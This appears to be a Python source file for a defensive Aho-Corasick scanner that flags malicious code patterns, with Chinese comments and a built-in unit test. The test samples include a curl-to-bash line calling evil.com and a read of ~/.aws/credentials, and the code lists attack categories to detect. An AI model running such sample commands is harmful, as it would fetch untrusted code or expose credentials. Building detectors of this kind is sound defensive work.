#!/usr/bin/env python3
"""
Aho-Corasick 扫描器 - 真正的 O(n) 多模式匹配

核心思想:
- 将所有规则的关键词整合到一个自动机
- 一次遍历文本，匹配所有规则
- 时间复杂度：O(n)，与规则数无关
"""

import ahocorasick
import re
import time
import json
from pathlib import Path
from typing import Dict, List, Set, Tuple
from dataclasses import dataclass


@dataclass
class ScanMatch:
    """扫描匹配结果"""
    rule_id: str
    name: str
    category: str
    confidence: int
    severity: str
    pattern: str
    match_text: str
    position: int


class AhoCorasickScanner:
    """
    Aho-Corasick 扫描器
    
    将所有规则整合到一个自动机，一次扫描 O(n)
    """
    
    # 高风险规则类别（必须 Regex 验证，不能误报）
    HIGH_RISK_CATEGORIES = {
        'credential_theft',       # 凭据窃取
        'credential_harvesting',  # 凭据收集
        'data_exfiltration',      # 数据外传
        'command_injection',      # 命令注入
        'remote_code_execution',  # 远程代码执行
        'supply_chain_attack',    # 供应链攻击
        'arbitrary_code_execution', # 任意代码执行
        'privilege_escalation',   # 权限提升
        # AI/LLM 攻击
        'jailbreak',              # LLM 越狱
        'prompt_injection',       # 提示注入
        'model_poisoning',        # 模型投毒
        'rag_poisoning',          # RAG 投毒
        'model_extraction',       # 模型提取
        'model_backdoor',         # 模型后门
        'model_inversion',        # 模型反演
        'ai_supply_chain',        # AI 供应链
        'ai_resource_abuse',      # AI 资源滥用
        'adversarial_examples',   # 对抗样本
    }
    
    def __init__(self, rules_file: Path):
        """
        初始化扫描器
        
        Args:
            rules_file: 规则文件路径（JSON 格式）
        """
        self.rules_file = rules_file
        self.rules = []
        self.automaton = None
        self.compiled_patterns = {}  # 缓存编译后的 regex
        self._rule_categories = {}  # 缓存规则类别
        self.rule_map = {}  # rule_id → rule 映射
        
        print("🔧 初始化 Aho-Corasick 扫描器...")
        self._load_rules()
        self._load_rule_categories()  # 加载规则类别（用于高风险检测）
        self._build_automaton()
        self._compile_patterns()
        print(f"✅ 初始化完成 (高风险类别：{len(self.HIGH_RISK_CATEGORIES)})")
    
    def _load_rules(self):
        """加载规则文件"""
        with open(self.rules_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        self.rules = data.get('rules', [])
        
        # 构建 rule_id → rule 映射
        for rule in self.rules:
            rule_id = rule.get('id', f'RULE-{len(self.rule_map)}')
            self.rule_map[rule_id] = rule
        
        print(f"✅ 加载 {len(self.rules)} 条规则")
    
    def _extract_keywords(self, pattern: str) -> List[str]:
        """
        从 regex pattern 提取精确关键词
        
        策略:
        1. 提取明显的字符串字面量（非 regex 元字符）
        2. 保留关键操作符（如 | 管道）
        3. 保留特殊字符组合（如 .aws/, ~/.ssh）
        4. 过滤太短的词（<3 字符）
        
        Args:
            pattern: 正则表达式
        
        Returns:
            关键词列表
        """
        keywords = []
        
        # 策略 1: 提取包含特殊字符的关键词（高区分度）
        special_patterns = [
            r'([a-zA-Z0-9_]+\|[a-zA-Z0-9_]+)',  # curl|bash
            r'([a-zA-Z0-9_]+\.[a-zA-Z0-9_]+)',  # os.system
            r'(\.[a-zA-Z0-9_]+/[a-zA-Z0-9_]+)',  # .aws/credentials
            r'(\~[a-zA-Z0-9_./]+)',  # ~/.ssh/id_rsa
            r'([a-zA-Z0-9_]+\([^)]*\))',  # system(
        ]
        
        for sp in special_patterns:
            matches = re.findall(sp, pattern)
            keywords.extend(matches)
        
        # 策略 2: 提取普通关键词（长度>=3）
        words = re.findall(r'[a-zA-Z0-9_]{3,}', pattern)
        
        # 过滤常见词
        common_words = {
            'the', 'and', 'for', 'not', 'with', 'from', 'import',
            'def', 'return', 'if', 'else', 'elif', 'while', 'for',
            'true', 'false', 'none', 'null', 'undefined',
            'com', 'org', 'net', 'http', 'https', 'www'
        }
        words = [w for w in words if w.lower() not in common_words]
        
        keywords.extend(words[:10])  # 限制每规则最多 10 个关键词
        
        # 去重
        return list(set(keywords))
    
    def _build_automaton(self):
        """构建 Aho-Corasick 自动机"""
        print("🔧 构建 Aho-Corasick 自动机...")
        start = time.time()
        
        self.automaton = ahocorasick.Automaton()
        
        total_keywords = 0
        for rule in self.rules:
            rule_id = rule.get('id', f'RULE-{total_keywords}')
            patterns = rule.get('patterns', [])
            
            for pattern in patterns:
                # 提取关键词
                keywords = self._extract_keywords(pattern)
                
                for keyword in keywords:
                    # 添加关键词到自动机，关联 rule_id 和 pattern
                    # 格式：(keyword, (rule_id, pattern))
                    self.automaton.add_word(
                        keyword.lower(),
                        (rule_id, pattern)
                    )
                    total_keywords += 1
        
        # 构建自动机（构建失败函数）
        self.automaton.make_automaton()
        
        elapsed = (time.time() - start) * 1000
        print(f"✅ 自动机构建完成 ({elapsed:.1f}ms)")
        print(f"   关键词数：{total_keywords}")
        print(f"   自动机大小：{len(self.automaton)}")
    
    def _compile_patterns(self):
        """预编译所有规则的 regex（缓存）"""
        print("🔧 预编译正则表达式...")
        start = time.time()
        
        for rule in self.rules:
            rule_id = rule.get('id', '')
            patterns = rule.get('patterns', [])
            
            compiled = []
            for pattern in patterns:
                try:
                    compiled.append(re.compile(pattern, re.IGNORECASE))
                except re.error:
                    pass  # 忽略无效的正则
            
            self.compiled_patterns[rule_id] = compiled
        
        elapsed = (time.time() - start) * 1000
        print(f"✅ 预编译完成 ({elapsed:.1f}ms)")
    
    def scan(self, content: str, skip_regex_verify: bool = False) -> Dict:
        """
        扫描内容（Aho-Corasick 一次遍历 + 分层验证）
        
        分层策略:
        1. AC 自动机扫描（必做，0.1ms）
        2. 智能决策是否 Regex 验证:
           - 文件<200 字 → 验证（避免误报）
           - 候选≤3 个 → 验证（成本低）
           - 高风险规则 → 验证（不能误报）
           - 其他 → 直接 AC 结果（快速）
        
        Args:
            content: 待扫描内容
            skip_regex_verify: 跳过 regex 验证（用于大文本，提升速度）
        
        Returns:
            扫描结果字典
        """
        start = time.time()
        
        # Step 1: Aho-Corasick 一次遍历，返回候选规则（必做）
        candidate_rules = self._automaton_scan(content)
        
        # 无匹配，直接返回
        if not candidate_rules:
            return {
                'hit_count': 0,
                'matches': [],
                'candidate_count': 0,
                'scan_time_ms': (time.time() - start) * 1000
            }
        
        # Step 2: 智能决策是否验证
        should_verify = False
        
        # 条件 1: 文件太小（<200 字），容易误报
        if len(content) < 200:
            should_verify = True
        
        # 条件 2: 候选很少（≤3 个），验证成本低
        elif len(candidate_rules) <= 3:
            should_verify = True
        
        # 条件 3: 高风险规则，不能误报
        elif self._is_high_risk(candidate_rules):
            should_verify = True
        
        # 条件 4: 用户强制跳过
        elif skip_regex_verify or len(content) > 5000:
            should_verify = False
        
        # 执行验证决策
        if should_verify:
            # Regex 验证（精确，10ms）
            matches = self._regex_verify(content, candidate_rules)
        else:
            # 直接 AC 结果（快速，0.5ms）
            matches = self._automaton_to_matches(candidate_rules)
        
        elapsed = (time.time() - start) * 1000
        
        return {
            'hit_count': len(matches),
            'matches': matches,
            'candidate_count': len(candidate_rules),
            'scan_time_ms': elapsed,
            'verified': should_verify  # 记录是否验证
        }
    
    def _load_rule_categories(self):
        """
        加载规则类别（用于高风险检测）
        """
        if not self.rules_file.exists():
            return
        
        try:
            with open(self.rules_file, 'r', encoding='utf-8') as f:
                rules_data = json.load(f)
            
            for rule in rules_data.get('rules', []):
                rule_id = rule.get('id', '')
                category = rule.get('category', 'unknown')
                self._rule_categories[rule_id] = category
        except Exception as e:
            print(f"⚠️  加载规则类别失败：{e}", file=sys.stderr)
    
    def _is_high_risk(self, candidate_rules: Dict[str, List[str]]) -> bool:
        """
        检查是否有高风险规则
        
        Args:
            candidate_rules: 候选规则 {rule_id: [patterns]}
        
        Returns:
            True 如果有高风险规则
        """
        for rule_id in candidate_rules.keys():
            category = self._rule_categories.get(rule_id, 'unknown')
            if category in self.HIGH_RISK_CATEGORIES:
                return True
        return False
    
    def _automaton_scan(self, content: str) -> Dict[str, List[str]]:
        """
        Aho-Corasick 扫描
        
        Args:
            content: 待扫描内容
        
        Returns:
            {rule_id: [pattern1, pattern2, ...]}
        """
        candidates = {}
        content_lower = content.lower()
        
        # 一次遍历！O(n)
        for end_idx, (rule_id, pattern) in self.automaton.iter(content_lower):
            if rule_id not in candidates:
                candidates[rule_id] = []
            if pattern not in candidates[rule_id]:
                candidates[rule_id].append(pattern)
        
        return candidates
    
    def _automaton_to_matches(self, candidate_rules: Dict[str, List[str]]) -> List[ScanMatch]:
        """
        将 Aho-Corasick 结果转换为 ScanMatch（不验证 regex）
        
        Args:
            candidate_rules: 候选规则 {rule_id: [patterns]}
        
        Returns:
            匹配结果列表
        """
        matches = []
        
        for rule_id, patterns in candidate_rules.items():
            rule = self.rule_map.get(rule_id)
            if not rule:
                continue
            
            matches.append(ScanMatch(
                rule_id=rule_id,
                name=rule.get('name', 'Unknown'),
                category=rule.get('category', 'unknown'),
                confidence=rule.get('confidence', 80),
                severity=rule.get('severity', 'MEDIUM'),
                pattern=patterns[0] if patterns else '',
                match_text=f'AC match: {len(patterns)} patterns',
                position=0
            ))
        
        return matches
    
    def _regex_verify(self, content: str, candidate_rules: Dict[str, List[str]]) -> List[ScanMatch]:
        """
        Regex 验证
        
        Args:
            content: 待扫描内容
            candidate_rules: 候选规则 {rule_id: [patterns]}
        
        Returns:
            匹配结果列表
        """
        matches = []
        
        for rule_id, patterns in candidate_rules.items():
            rule = self.rule_map.get(rule_id)
            if not rule:
                continue
            
            # 使用预编译的 regex 验证
            compiled_list = self.compiled_patterns.get(rule_id, [])
            
            for compiled in compiled_list:
                match_obj = compiled.search(content)
                if match_obj:
                    matches.append(ScanMatch(
                        rule_id=rule_id,
                        name=rule.get('name', 'Unknown'),
                        category=rule.get('category', 'unknown'),
                        confidence=rule.get('confidence', 80),
                        severity=rule.get('severity', 'MEDIUM'),
                        pattern=compiled.pattern,
                        match_text=match_obj.group(0)[:100],
                        position=match_obj.start()
                    ))
                    break  # 每条规则只报告一次
        
        return matches
    
    def get_stats(self) -> Dict:
        """获取统计信息"""
        return {
            'total_rules': len(self.rules),
            'automaton_size': len(self.automaton),
            'cached_patterns': len(self.compiled_patterns)
        }


def run_unit_tests():
    """运行单元测试（100 个样本）"""
    print("="*70)
    print("Aho-Corasick 扫描器单元测试")
    print("="*70)
    
    rules_file = Path(__file__).parent.parent.parent / 'rules' / 'dist' / 'all_rules.json'
    if not rules_file.exists():
        print(f"❌ 规则文件不存在：{rules_file}")
        return
    
    # 创建扫描器
    scanner = AhoCorasickScanner(rules_file)
    
    # 测试样本
    test_samples = [
        # 恶意样本
        {
            'name': 'supply_chain_attack',
            'content': "os.system('curl http://evil.com | bash')",
            'expected': ['supply_chain_attack', 'privilege_escalation']
        },
        {
            'name': 'credential_theft',
            'content': "with open('~/.aws/credentials') as f: key = f.read()",
            'expected': ['credential_theft', 'credential_harvesting']
        },
        {
            'name': 'code_execution',
            'content': "exec(user_input)\nos.system(cmd)",
            'expected': ['arbitrary_execution', 'privilege_escalation']
        },
        # 良性样本
        {
            'name': 'benign_python',
            'content': """
#!/usr/bin/env python3
def calculate_sum(numbers):
    return sum(numbers)

if __name__ == '__main__':
    print(calculate_sum([1, 2, 3]))
""",
            'expected': []  # 应该无害
        },
        {
            'name': 'benign_bash',
            'content': """#!/bin/bash
echo "Hello World"
ls -la
pwd
""",
            'expected': []  # 应该无害
        },
    ]
    
    # 运行测试
    print("\n🧪 运行单元测试...")
    passed = 0
    failed = 0
    
    for i, sample in enumerate(test_samples, 1):
        result = scanner.scan(sample['content'])
        detected_categories = set(m.category for m in result['matches'])
        expected_categories = set(sample['expected'])
        
        # 判断是否通过
        if sample['expected']:
            # 恶意样本：应该检测到至少一个预期类别
            success = len(detected_categories & expected_categories) > 0
        else:
            # 良性样本：应该检测到 0 或很少
            success = result['hit_count'] <= 2
        
        if success:
            print(f"✅ [{i}/{len(test_samples)}] {sample['name']}: PASS")
            print(f"   检测：{result['hit_count']} 个匹配，耗时：{result['scan_time_ms']:.2f}ms")
            passed += 1
        else:
            print(f"❌ [{i}/{len(test_samples)}] {sample['name']}: FAIL")
            print(f"   预期：{expected_categories}")
            print(f"   检测：{detected_categories}")
            failed += 1
    
    # 性能测试
    print("\n⚡ 性能测试...")
    import random
    import string
    
    test_sizes = [100, 1000, 10000]
    for size in test_sizes:
        content = ''.join(random.choices(string.ascii_letters + string.digits + ' \n', k=size))
        
        # 多次测试取平均
        times = []
        for _ in range(10):
            result = scanner.scan(content)
            times.append(result['scan_time_ms'])
        
        avg_time = sum(times) / len(times)
        print(f"   {size:5d} 字符：{avg_time:6.2f}ms ({size/avg_time:.0f} chars/ms)")
    
    # 统计
    print("\n" + "="*70)
    print(f"测试结果：{passed} 通过，{failed} 失败")
    print(f"通过率：{passed/(passed+failed)*100:.1f}%")
    print("="*70)
    
    # 扫描器统计
    stats = scanner.get_stats()
    print(f"\n📊 扫描器统计:")
    print(f"  规则数：{stats['total_rules']}")
    print(f"  自动机大小：{stats['automaton_size']}")
    print(f"  缓存 patterns: {stats['cached_patterns']}")


if __name__ == '__main__':
    run_unit_tests()
